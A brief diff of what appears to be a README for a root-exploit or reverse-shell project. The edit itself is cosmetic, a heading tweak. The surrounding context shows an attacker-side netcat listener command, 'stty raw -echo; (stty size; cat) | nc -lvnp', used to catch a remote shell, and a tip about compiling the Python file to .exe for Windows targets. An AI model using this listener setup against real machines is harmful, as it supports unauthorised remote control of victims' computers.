@@ -12,7 +12,7 @@ exploit to gain root 🌳.
 # How to start the attack
 start by listening on the attackers side 
 command : ssty raw -echo; (stty size; cat) | nc -lvnp port -s IPaddr
-Important: 
+#❗ Important: 
 You might if attacking a windows pc turn the py file in to a .exe file.
 
 # 📎 Refernces used in this project 
